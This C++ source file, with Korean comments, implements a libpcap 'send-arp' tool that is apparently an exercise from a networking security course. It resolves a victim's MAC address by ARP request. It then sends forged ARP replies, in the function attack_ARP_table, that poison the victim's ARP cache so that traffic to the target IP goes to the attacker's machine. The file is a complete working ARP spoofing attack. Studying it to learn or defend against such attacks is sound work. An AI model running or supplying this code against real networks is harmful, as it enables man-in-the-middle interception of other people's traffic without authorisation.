#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <map>
#include <string>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender_ip> <target_ip>\n");
    printf("sample: send-arp wlan0 10.0.0.1 10.0.0.2\n");
}

// MAC 주소와 IP 주소를 얻는 함수
int get_mac_and_ip(const char* interface, Mac* mac_addr, Ip* interface_ip) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    // MAC 주소 얻기
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        close(sockfd);
        return -1;
    }

    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;

    std::ostringstream mac_stream;
    mac_stream << std::hex << std::setw(2) << std::setfill('0') << (int)mac[0] << ":"
               << std::hex << std::setw(2) << std::setfill('0') << (int)mac[1] << ":"
               << std::hex << std::setw(2) << std::setfill('0') << (int)mac[2] << ":"
               << std::hex << std::setw(2) << std::setfill('0') << (int)mac[3] << ":"
               << std::hex << std::setw(2) << std::setfill('0') << (int)mac[4] << ":"
               << std::hex << std::setw(2) << std::setfill('0') << (int)mac[5];

    std::string mac_str = mac_stream.str();

    printf("%s\n", mac_str.c_str());
    *mac_addr = Mac(mac_str);

    // IP 주소 얻기
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("Failed to get IP address");
        close(sockfd);
        return -1;
    }
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    *interface_ip = Ip(ipaddr->sin_addr.s_addr);

    close(sockfd);
    return 0;
}

// MAC 주소를 출력하는 함수
void print_mac(const Mac& mac) {
    const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&mac);
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_bytes[0], mac_bytes[1], mac_bytes[2],
           mac_bytes[3], mac_bytes[4], mac_bytes[5]);
}

// ARP 요청을 보내서 송신자의 MAC 주소를 얻는 함수
int request_arp_for_sender_mac(pcap_t* handle, Mac* interface_mac, Mac* sender_mac, std::string sender_ip, Ip* interface_ip) {
    struct EthArpPacket req_packet;
    struct EthArpPacket* res_packet;

    req_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // 브로드캐스팅
    req_packet.eth_.smac_ = *interface_mac;
    req_packet.eth_.type_ = htons(EthHdr::Arp);

    req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_packet.arp_.pro_ = htons(EthHdr::Ip4);
    req_packet.arp_.hln_ = Mac::SIZE;
    req_packet.arp_.pln_ = Ip::SIZE;
    req_packet.arp_.op_ = htons(ArpHdr::Request); 
    req_packet.arp_.smac_ = *interface_mac;
    req_packet.arp_.sip_ = *interface_ip;
    req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 
    req_packet.arp_.tip_ = htonl(Ip(sender_ip)); 

    printf("[DEBUG] Sending ARP request for IP: %s\n", sender_ip.c_str());
    
    int res = pcap_sendpacket(handle, (const u_char*)&req_packet, sizeof(struct EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }

    // 응답을 기다리는 루프
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        struct EthHdr* res_eth_packet;
        struct ArpHdr* res_arp_packet;
        
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; 
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return -1;
        }

        res_eth_packet = (struct EthHdr *)packet;
        res_arp_packet = (struct ArpHdr *)(packet + sizeof(*res_eth_packet));
	    
        struct in_addr sender_ip_addr, target_ip_addr;
        sender_ip_addr.s_addr = htonl(res_arp_packet->sip());
        target_ip_addr.s_addr = htonl(res_arp_packet->tip());

        printf("[DEBUG] Received ARP packet - Sender IP: %s, Target IP: %s\n",
               inet_ntoa(sender_ip_addr), inet_ntoa(target_ip_addr));
        print_mac(res_arp_packet->smac());

        // ARP 응답 패킷인지 확인
        if (res_eth_packet->type() == EthHdr::Arp &&
            res_arp_packet->op() == ArpHdr::Reply &&
            res_arp_packet->sip() == Ip(sender_ip))  { 

            // 송신자의 MAC 주소를 저장
            *sender_mac = res_arp_packet->smac(); 

            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(sender_mac);
            printf("[DEBUG] Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                mac_bytes[0], mac_bytes[1], mac_bytes[2],
                mac_bytes[3], mac_bytes[4], mac_bytes[5]);

            break;
        }
    }
    return 0;
}

// ARP 테이블을 공격하는 함수
int attack_ARP_table(pcap_t* handle, Mac* sender_mac, std::string sender_ip, Mac* interface_mac , std::string target_ip){
    EthArpPacket packet;
    
	packet.eth_.dmac_ = *sender_mac;
	packet.eth_.smac_ = *interface_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = *interface_mac;
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = *sender_mac;
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
	}
    printf("attack success\n");
	return 0;
}

int main(int argc, char* argv[]) {
    std::multimap<std::string, std::string> mmap;
    std::string sender_ip;
    std::string target_ip;
    std::string prev_sender_ip = "";

    // 인터페이스 이름 가져오기
    const char* dev = argv[1];

    Mac interface_mac;
    Mac sender_mac;
    Ip interface_ip;

    // MAC 주소와 IP 주소 얻기
    if (get_mac_and_ip(dev, &interface_mac, &interface_ip) != 0) {
        fprintf(stderr, "Failed to get MAC or IP address for device %s\n", dev);
        return -1;
    }

    // pcap 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 인자 처리
    for(int i=2;i<argc;i += 2){
        mmap.insert({argv[i], argv[i+1]});
    }

    // ARP 요청 및 공격 루프
    for (const auto& pair : mmap) {
        sender_ip = pair.first;
        target_ip = pair.second;
        if(sender_ip != prev_sender_ip){
            if (request_arp_for_sender_mac(handle, &interface_mac, &sender_mac, sender_ip, &interface_ip) != 0) {
                fprintf(stderr, "Failed to get Sender's MAC address for device\n");
                continue;
            }
        }

        if (attack_ARP_table(handle, &sender_mac, sender_ip, &interface_mac , target_ip) != 0) {
            fprintf(stderr, "Failed to attack ARP table\n");
            return -1;
        }

        prev_sender_ip = sender_ip;
    }

    pcap_close(handle);
    return 0;
}
